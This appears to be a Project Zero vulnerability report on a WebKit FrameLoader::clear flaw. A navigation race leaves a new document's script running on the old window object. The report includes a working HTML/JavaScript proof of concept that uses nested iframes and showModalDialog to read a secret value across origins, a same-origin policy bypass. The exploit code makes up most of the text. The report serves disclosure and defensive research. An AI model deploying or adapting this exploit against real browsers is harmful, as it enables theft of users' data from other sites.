Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1162
 
void FrameLoader::clear(Document* newDocument, bool clearWindowProperties, bool clearScriptObjects, bool clearFrameView)
{
    m_frame.editor().clear();
 
    if (!m_needsClear)
        return;
    m_needsClear = false;
     
    if (m_frame.document()->pageCacheState() != Document::InPageCache) {
        ...
        if (hadLivingRenderTree)
            m_frame.document()->removeFocusedNodeOfSubtree(*m_frame.document());
    }
    ...
    m_frame.setDocument(nullptr); <<------- (b)
    ...
    if (clearWindowProperties)
        m_frame.script().setDOMWindowForWindowShell(newDocument->domWindow()); <<------- (c)
    ...
}
 
FrameLoader::clear is called when page navigation is made and it does:
1. clear the old document at (b).
2. attach the new window object at (c).
 
If a new page navigation is made at (a), the new window will not attached due to |m_needsClear| check. As a result, the new document&#039;s script will be execute on the old window object.
 
PoC will reproduce to steal |secret_key| value from another origin(data:text/html,...).
 
PoC:
-->
 
<body>
Click anywhere.
<script>
function createURL(data, type = &#039;text/html&#039;) {
    return URL.createObjectURL(new Blob([data], {type: type}));
}
 
window.onclick = () => {
    window.onclick = null;
 
    let f = document.body.appendChild(document.createElement(&#039;iframe&#039;));
    f.contentDocument.open();
    f.contentDocument.onreadystatechange = () => {
        f.contentDocument.onreadystatechange = null;
 
        let g = f.contentDocument.appendChild(document.createElement(&#039;iframe&#039;));
        g.contentDocument.open();
        g.contentDocument.onreadystatechange = () => {
            g.contentDocument.onreadystatechange = null;
 
            f.contentWindow.__defineGetter__(&#039;navigator&#039;, function () {
                return {};
            });
 
            let a = f.contentDocument.createElement(&#039;a&#039;);
            a.href = &#039;data:text/html,&#039; + encodeURI(`<script>var secret_key = &#039;23412341234&#039;;</scrip` + &#039;t>&#039;);
            a.click();
 
            showModalDialog(createURL(`
<script>
let it = setInterval(() => {
    try {
        opener[0].frameElement.contentDocument.x;
    } catch (e) {
        clearInterval(it);
        window.close();
    }
}, 100);
</scrip` + &#039;t>&#039;));
 
            alert(&#039;secret_key:&#039; + f.contentWindow.secret_key);
            //showModalDialog(&#039;about:blank&#039;);
        };
    };
 
    f.src = &#039;javascript:""&#039;;
}
 
</script>
</body>

